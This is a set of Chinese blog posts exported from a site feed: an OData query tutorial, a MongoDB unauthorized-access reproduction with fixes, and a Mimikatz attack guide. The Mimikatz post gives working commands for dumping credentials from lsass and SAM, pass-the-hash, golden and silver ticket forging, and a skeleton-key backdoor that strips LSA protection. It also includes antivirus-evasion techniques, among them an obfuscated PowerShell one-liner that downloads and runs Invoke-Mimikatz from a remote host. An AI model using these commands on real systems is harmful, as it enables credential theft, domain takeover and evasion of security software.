<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询格式：GET  ~/实体类型?$select=实体属性1，实体属性2</span><br></pre></td></tr></table></figure>



<p>示例:</p>
<p>返回Category属性在包含的数据中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products?$select=Category</span><br></pre></td></tr></table></figure>

<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116134650724.png" class title="image-20211116134650724">



<h4 id="展开查询-expand"><a href="#展开查询-expand" class="headerlink" title="展开查询($expand)"></a>展开查询($expand)</h4><p>$expand的查询帮助将实体类型的导航属性的值加入请求的返回数据中，查询获取实体集合下的其他实体子集。</p>
<p>OData中的实体类型之间有关系（relationship）。比如顾客（Customer）类型可以有一系列的订单（Orders）。这样一来，顾客类型与订单类型相关。顾客类型上可以定义导航属性（navigation property）用于描述这种关系（如上例中Customer类型的Orders属性）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询格式: GET ~/实体类型集合?$expand=其他实体类型</span><br></pre></td></tr></table></figure>



<p>示例:</p>
<p>返回Customers类型中Orders的子集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Customers?$expand=Orders</span><br></pre></td></tr></table></figure>

<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116135324387.png" class title="image-20211116135324387">



<h4 id="过滤查询-filter"><a href="#过滤查询-filter" class="headerlink" title="过滤查询($filter)"></a>过滤查询($filter)</h4><p>OData内置了一系列如上面例子中”gt”的过滤操作符（filter operations）和一些查询函数（query functions）用来支持不同的过滤查询需求。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询语句: GET ~/实体?$filter=实体属性操作语句 </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Customers(&#x27;ALFKI&#x27;)?$filter=Country%20eq%20%27Germany%27</span><br></pre></td></tr></table></figure>

<p>返回Customers(‘ALFKI’)中Country属性为Germany的数据</p>
<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116142402227.png" class title="image-20211116142402227">



<p>过滤查询设置表达式需要内置过滤操作符</p>
<p>参考文档如下；</p>
<p><a href="http://docs.oasis-open.org/odata/odata/v4.0/errata02/os/complete/part1-protocol/odata-v4.0-errata02-os-part1-protocol-complete.html#_Toc406398303">OData Version 4.0 Part 1: Protocol Plus Errata 02 (oasis-open.org)</a></p>
<h4 id="统计总数-count"><a href="#统计总数-count" class="headerlink" title="统计总数($count)"></a>统计总数($count)</h4><p>$count用来统计实体集合中实体数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">统计命令： https://services.odata.org/V3/Northwind/Northwind.svc/实体集合/$count</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products/$count</span><br></pre></td></tr></table></figure>

<p>统计Product类型实体的总数为77</p>
<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116142842365.png" class title="image-20211116142842365">



<h4 id="限定范围-top和-skip"><a href="#限定范围-top和-skip" class="headerlink" title="限定范围($top和$skip)"></a>限定范围($top和$skip)</h4><p>$top返回查询结果中的前n条记录，$skip越过查询结果中的n条记录，这两个参数都常用来分页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询命令 :  https://services.odata.org/V3/Northwind/Northwind.svc/实体集合?$top=n&amp;$skip=n</span><br></pre></td></tr></table></figure>



<p>查询Products实体集合前2条记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products?$top=2</span><br></pre></td></tr></table></figure>

<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116143548406.png" class title="image-20211116143548406">



<p>查询Products实体集合中不包含前两条记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products?$skip=2</span><br></pre></td></tr></table></figure>

<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116144246408.png" class title="image-20211116144246408">



<p>查询获取第3和第4个实体集合的记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products?$top=2&amp;$skip=2</span><br></pre></td></tr></table></figure>

<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116144447375.png" class title="image-20211116144447375">



<h4 id="格式化输出-format"><a href="#格式化输出-format" class="headerlink" title="格式化输出($format)"></a>格式化输出($format)</h4><p>将查询返回的数据JSON格式化。Service document和metadata document只能以XML格式展示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式化命令:https://services.odata.org/V3/Northwind/Northwind.svc/实体集合?$format=json</span><br></pre></td></tr></table></figure>



<p>将查询结果输出为json格式</p>
<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116145230659.png" class title="image-20211116145230659">



<h4 id="排序输出-orderby"><a href="#排序输出-orderby" class="headerlink" title="排序输出($orderby)"></a>排序输出($orderby)</h4><p>根据结果中的属性字段进行排序(AES升序,DESC降序)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:https://services.odata.org/V3/Northwind/Northwind.svc/实体集合?$orderby=实体属性%20desc/aes</span><br></pre></td></tr></table></figure>



<p>将前两条记录中的UnitPrice属性降序处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:https://services.odata.org/V3/Northwind/Northwind.svc/Products?$top=2&amp;$orderby=UnitPrice%20desc&amp;$format=json</span><br></pre></td></tr></table></figure>

<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116152912055.png" class title="image-20211116152912055">



<h4 id="获取资源总数-inlinecount"><a href="#获取资源总数-inlinecount" class="headerlink" title="获取资源总数($inlinecount)"></a>获取资源总数($inlinecount)</h4><p>分页取数据的时候,同时统计总记录数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令:https://services.odata.org/V3/Northwind/Northwind.svc/实体集合?$inlinecount=allpages</span><br></pre></td></tr></table></figure>



<p>获取Products实体集合中符合条件的资源总数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products?$inlinecount=allpages&amp;$format=json</span><br></pre></td></tr></table></figure>

<img src="/2022/01/23/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116155709323.png" class title="image-20211116155709323">]]></content>
      <categories>
        <category>内功心法</category>
        <category>协议用法</category>
      </categories>
      <tags>
        <tag>-ODATA -协议</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB未授权访问漏洞</title>
    <url>/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>测试环境：Centos7</p>
<p>安装前先安装依赖包</p>
<p><strong>Red Hat&#x2F;CentOS：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install libcurl openssl</span><br></pre></td></tr></table></figure>



<p><strong>Ubuntu 18.04 LTS (“Bionic”)&#x2F;Debian 10 “Buster”：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl4 openssl</span><br></pre></td></tr></table></figure>



<p><strong>Ubuntu 16.04 LTS (“Xenial”)&#x2F;Debian 9 “Stretch”：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl3 openssl</span><br></pre></td></tr></table></figure>



<p>下载MongoDB</p>
<p>MongoDB 源码下载地址：<a href="https://www.mongodb.com/download-center/#community">https://www.mongodb.com/download-center\#community</a></p>
<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1ed1e326da0b82a3ba6a9acc177ad6d1.jpg" class>



<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5fc344136eee4a58c0d0dcd509a488df.jpg" class>

<p>MongoDB的可执行文件在bin目录下，将其添加到$PATH路径中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=\&lt;mongodb-install-directory\&gt;/bin:\$PATH</span><br></pre></td></tr></table></figure>



<p>创建数据库目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mkdir -p /data/db</span><br></pre></td></tr></table></figure>



<p>创建数据库存放目录和日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /data               //创建数据库目录</span><br><span class="line"></span><br><span class="line">sudo mkdir db    //创建日志</span><br><span class="line"></span><br><span class="line">sudo touch log</span><br></pre></td></tr></table></figure>



<p>命令行中启动MongoDB服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> cd 安装路径/mongo/bin</span><br><span class="line"></span><br><span class="line">sudo ./mongod --dbpath=/data/db --   logpath=/data/logs</span><br></pre></td></tr></table></figure>



<p>Mongodb启动成功</p>
<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/393a5bd543d9da0ed85c0dec2efcdec4.png" class>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录Mongodb控制台</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: mongod 127.0.0.1:27017</span><br></pre></td></tr></table></figure>

<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/996ace683b6e8b7130df8cda3d0efc62.png" class>



<p>登录成功后，使用语句进行查询操作，发现数据库admin没有数据，没有添加用户</p>
<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3186b9e9e72cf57cf9585d9f09ddbcbe.png" class>



<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1) 为 MongoDB 添加认证</p>
<p>① MongoDB 启动时添加 -auth 参数。</p>
<p>② 给 MongoDB 添加用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin \# 使用 admin 库</span><br><span class="line"></span><br><span class="line">db.addUser“用户名” “密码”\# 添加用户名、密码</span><br><span class="line"></span><br><span class="line">db.auth“用户名”,“密码”\# 验证是否添加成功返回 1 说明成功。</span><br></pre></td></tr></table></figure>



<p>(2) 禁用 HTTP 和 REST 端口</p>
<p>MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6<br>版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务一般不需要通过<br>Web 方式进行远程管理建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohttpinterface = false</span><br></pre></td></tr></table></figure>



<p>(3) 限制绑定 IP</p>
<p>启动时加入参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--bind_ip 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>或在 &#x2F;etc&#x2F;mongodb.conf 文件中添加以下内容 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind_ip = 127.0.0.1</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>未授权访问</category>
      </categories>
      <tags>
        <tag>-Web漏洞 -未授权访问 -MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Mimikatz运行姿势</title>
    <url>/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="Mimikatz运行姿势"><a href="#Mimikatz运行姿势" class="headerlink" title="Mimikatz运行姿势"></a>Mimikatz运行姿势</h1><hr>
<p>上篇文章记录了Mimikatz神器的基本命令和很多模块的使用方法命令。由于在实际环境中可能会产生不同的问题，这篇文章记录学习Mimikatz工具的使用姿势和一些免杀方法。</p>
<h2 id="获取本地账户密码"><a href="#获取本地账户密码" class="headerlink" title="获取本地账户密码"></a>获取本地账户密码</h2><hr>
<h3 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h3><p>首先将执行权限提升为debug权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103351984.png" class title="image-20211103103351984">



<p>使用sekurlsa模块抓取明文密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103420451.png" class title="image-20211103103420451">



<p>注:当目标为win10或2012R2以上时，默认禁止在内存中保存明文密码，但可以通过修改注册表的方式来抓取明文。</p>
<p>修改命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Sec urityProviders\WDigest  /v UseLogonCredential /t REG_DWORD  /d  1  /f</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103105046333.png" class title="image-20211103105046333">



<h3 id="SAM表离线获取hash"><a href="#SAM表离线获取hash" class="headerlink" title="SAM表离线获取hash"></a>SAM表离线获取hash</h3><p>导出SAM数据库的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg  save  HKLM\SYSTEM  SYSTEM(自定义名称)</span><br><span class="line"></span><br><span class="line">reg  save  HKLM\SAM SAM(自定义名称)</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110249663.png" class title="image-20211103110249663">



<p>提取导出SAM数据中的hash(确保Mimikatz和导出文件在同一目录下或者指定SAM数据的绝对&#x2F;相对路径)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::sam /sam:SAM(自定义名称)  /system:SYSTEM(自定义名称)</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110638898.png" class title="image-20211103110638898">



<h2 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h2><hr>
<p>当mimikatz无法在目标主机上正常运行时，可以使用微软提供的工具Procdump导出lsass.exe进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procsump64.exe -accepteula -ma lsass.exe  lsass.tmp</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103111347692.png" class title="image-20211103111347692">



<p>使用 mimikatz的sekurlsa模块对导出的lsass.dmp文件。先使用minidump恢复到lsass.exe的状态，然后使用logonpasswords导出明文密码信息</p>
<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103113844380.png" class title="image-20211103113844380">



<p>可看到passwords.txt文档中系统的明文密码信息</p>
<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103115851943.png" class title="image-20211103115851943">



<h2 id="哈希传递攻击PTH"><a href="#哈希传递攻击PTH" class="headerlink" title="哈希传递攻击PTH"></a>哈希传递攻击PTH</h2><hr>
<h3 id="工作组环境"><a href="#工作组环境" class="headerlink" title="工作组环境"></a>工作组环境</h3><p>当我们获取到某一台主机中用户的NTLM哈希值时，可以直接将获取到的NTLM哈希值登录目标主机</p>
<p>命令；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pt /user:用户名   /domain:ip地址    /ntlm:用户的ntlm哈希值</span><br></pre></td></tr></table></figure>

<p>如下所示，我们可以直接登录目标主机cmd管理窗口，执行命令</p>
<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103130911394.png" class title="image-20211103130911394">

<p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令</p>
<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><p>在域环境下，如果获取到某一用户的ntlm哈希值，可以在域环境下任意主机登录用户，若获取到域控 管理员的账号和ntlm哈希值即可 登录域控。</p>
<p>命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pth  /user:用户  /domain:&quot;域名&quot;  /ntlm:用户ntlm哈希值</span><br></pre></td></tr></table></figure>



<h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><hr>
<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>在域环境下，每个用户的ticcket都是由krbtgt的密码NTLM哈希进行加密传输的，只要获取到krbtgt用户的密码NTLM哈希值就可以随意伪造Ticket，从而使用Ticket登录域控，使用krbtgt用户密码HTLM哈希生成的票据为黄金票据</p>
<p>首先获取krbtft用户的NTLM哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz  &quot;lsamdump::dcsync  /domain:xxx.com  /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>



<p>利用mimikatz生成域管理员权限的黄金票据，输入域管理员对应的账号，域名称和sid值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:xxx.COM /sid:管理员SID值 /krbtgt:krbtgt用户的哈希值 /ticket:test.kiribi(生成的票据)</span><br></pre></td></tr></table></figure>



<p>导出上面生成的票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt  test.kiribi</span><br></pre></td></tr></table></figure>



<p>查看导入后获取的域管权限，查看主机的目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir  \\$DC$.xxx.com\c$</span><br></pre></td></tr></table></figure>



<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据是伪造 TGS(票据授权服务)，只能访问指定的服务，由客户端计算机账号的NTLM哈希值进行加密。</p>
<p>下面使用白银票据伪造CIFS(用于Windows主机之间进行网络文件共享)服务权限</p>
<p>提升权限，获取主机账号的哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103161547663.png" class title="image-20211103161547663">

<p>这里的liukaifeng01的SID为S-1-5-21-295270202-1353902439-2381782089(不要后面的-1000)</p>
<p>伪造的OWA的NTLM哈希为84883cf100e1f84e2a2468f08d6d0e4f</p>
<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162043108.png" class title="image-20211103162043108">



<p>生成白银票据命令 :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:[domain] /sid:[SID] /target:服务用户.xxx.com /rc4:[server&#x27;s Hash] /service:[service] /user:[username] /ptt</span><br></pre></td></tr></table></figure>



<p>如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:GOD /sid:S-1-5-21-295270202-1353902439-2381782089( /target:OWA.GOD.com /rc4:84883cf100e1f84e2a2468f08d6d0e4f /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162850526.png" class title="image-20211103162850526">

<p>可以看到此时的liukaifeng01的key变成了OWA的，服务为cifs，生成了获取cifs的白银票据</p>
<p>伪造白银票据后，我们就可以远程访问DC</p>
<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103163128580.png" class title="image-20211103163128580">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注:若使用dir \\主机名\c$不能访问，则输入主机全名dir \\主机名.域名.com\c$</span><br></pre></td></tr></table></figure>



<h3 id="万能密钥"><a href="#万能密钥" class="headerlink" title="万能密钥"></a>万能密钥</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效</p>
<p>在域控上安装skeleton key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;misc::skeleton&quot;</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103171351475.png" class title="image-20211103171351475">



<p>在域内其他机器使用skeleton key去访问域控，添加密码围殴mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net  use   \\主机名.xxx.com\c$  mimikatz(密码)  /user:adtest \administrator</span><br></pre></td></tr></table></figure>



<p>微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</p>
<p>但mimikatz依然可以绕过，需要导入mimidrv.sys文件，命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103172059633.png" class title="image-20211103172059633">



<h2 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h2><hr>
<h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>在powershell中导入invoke-Mimikatz.ps1，加载mimikatz模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “import-module .Invoke-Mimikatz.ps1”</span><br></pre></td></tr></table></figure>

<p>运行mimikazt模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “invoke-Mimikatz”</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103194723187.png" class title="image-20211103194723187">

<p>在cmd中运行过程中没有被拦截</p>
<p>使用poweshell加载远程服务器的ps脚本，会被360拦截</p>
<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200143717.png" class title="image-20211103200143717">



<p>稍微做了简单的混淆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;192.168.211&#x27;+&#x27;.1/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure>

<p>还是被拦截</p>
<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200627835.png" class title="image-20211103200627835">

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200702681.png" class title="image-20211103200702681">



<p>所以最好将Invoke-Mimikatz.ps1文件放置在目标主机上执行powershell加载模块运行imikatz</p>
<h3 id="使用-net2-0"><a href="#使用-net2-0" class="headerlink" title="使用.net2.0"></a>使用.net2.0</h3><p>首先下载<a href="https://raw.githubusercontent.com/ssssanr/Mimikatz-Csharp/master/katz.cs">katz.cs</a>，将katz.cs文件保存到本地</p>
<p>并放在对应的系统版本的Framework目录中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位：C:\Windows\Microsoft.NET\Framework\v2.0.50727</span><br><span class="line">64位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727</span><br></pre></td></tr></table></figure>



<p>然后在powershell中执行命令生成key.snk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$key=&#x27;BwIA AAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z 6 4cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5cl HIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line"></span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line"></span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202206247.png" class title="image-20211103202206247">



<p>最后生成mimikatz，在运行mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br><span class="line">64位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.5072 7&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在运行时被360发现啦，火绒没有反应</p>
<img src="/2022/05/15/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202433218.png" class title="image-20211103202433218">



<h3 id="使用-net4-0"><a href="#使用-net4-0" class="headerlink" title="使用.net4.0"></a>使用.net4.0</h3><p>下载[mimikatz.xml](<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> mimikatz.xml)，将其保存在Framework64文件下的v4,0文件下并运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msbuild.exe mimikatz.xml</span><br></pre></td></tr></table></figure>
